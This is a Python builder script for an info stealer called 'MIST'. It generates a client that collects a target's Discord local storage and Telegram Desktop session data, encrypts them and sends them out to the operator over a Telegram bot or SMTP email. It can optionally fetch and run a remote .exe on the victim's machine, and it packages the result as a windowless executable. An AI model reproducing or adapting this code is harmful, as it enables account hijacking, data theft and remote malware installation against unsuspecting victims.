import pyfiglet
import os
from cryptography.fernet import Fernet
from random import randint as rand

columns = os.get_terminal_size().columns


def head():
    os.system('cls||clear')
    print('\033[92m', end="")
    banner = pyfiglet.figlet_format("MIST", font="banner", justify="center")
    print(banner)
    print("multifunctional info stealer toolkit".center(columns))
    print('\033[0m', end="")


def import_module(filename, code):
    data = open(filename, 'r').read()
    imports = data.split('# end_imports')[0]
    module_function = data.split('# end_imports')[1]
    return imports + code + module_function


def ask(answers, prompt, question):
    head()
    print('\n' + question)
    choise = input(prompt)
    if answers == None or choise in answers:
        return choise
    ask(answers, prompt, question)


platform = ask(['1', '2'], 'Enter a number(1/2) >> ', 'Choose data delivery method:\n  [ 1 ] - Telegram\n  [ 2 ] - E-mail')
session = str(rand(111111111, 999999999))
code = ""
if platform == '1':
    tg = 'Provide Telegram info.'
    token = ask(None, 'Paste your bot token >> ', tg)
    uid = ask(None, 'Telegram UID >> ', tg)
    delivery_method = 'MIST_telegram'
    args = f'"{token}", {uid}, "{session}.zip"'
else:
    email = 'Provide SMTP(E-mail) info.'
    sender = ask(None, 'Sender E-mail >> ', email)
    password = ask(None, 'Sender E-mail password/passcode >> ', email)
    receiver = ask(None, 'Receiver E-mail >> ', email)
    subj = ask(None, 'Mail subject >> ', email)
    smtp_domain = ask(None, 'SMTP domain >> ', email)
    smtp_port = ask(None, 'SMTP port >> ', email)
    delivery_method = 'MIST_email'
    args = f'"{sender}", "{password}", "{receiver}", "{subj}", "{session}.zip", "{smtp_domain}", {smtp_port}'

paths = {"Discord": ["%USERPROFILE%\\AppData\\Roaming\\discord\\Local Storage\\leveldb", "%USERPROFILE%\\AppData\\Roaming\\discord\\Local State"], "Telegram": ["%USERPROFILE%\\AppData\\Roaming\\Telegram Desktop\\tdata"]}

key = Fernet.generate_key()
open(session, 'wb').write(key)

code = import_module(delivery_method, code)
code = import_module('MIST_encryption', code)
code = import_module('MIST_collect', code)
custom_download = ask(['1', '2'], 'Enter a number(1/2) >> ', 'Do you want MIST to download custom .exe(by URL) to target\'s PC and run it?\n  [ 1 ] - Yes\n  [ 2 ] - No')
if custom_download == '1':
    code = import_module('MIST_custom_payload', code)
    url = ask(None, 'Enter your URL >> ', 'Do you want MIST to download custom .exe(by URL) to target\'s PC and run it?\n  [ 1 ] - Yes\n  [ 2 ]  - No')

code += f'\ntry:\n    collect_files({paths}, "{session}")\nexcept:\n    pass'
code += f'\ntry:\n    encrypt_data({key}, "{session}.zip")\nexcept:\n    pass'
code += f'\ntry:\n    send_file({args})\nexcept:\n    pass'
if custom_download == '1':
    code += f'\ndownload_executable("{url}")'
open(f'{session}.py', 'w').write(code)
buildexe = ask(['y', 'n'], 'Do it now?(y/n)', f'Created new client: {session}!\nSaved encryption key to {session} and client code to {session}.py\n You can use PyInstaller to build a binary file.')
if buildexe == 'y':
    os.sysyem('pyinstaller --onefile --noconsole ' + session + '.py')
    print('Executable built successfully and saved in ./dist.')
    input('Press Enter to continue...')
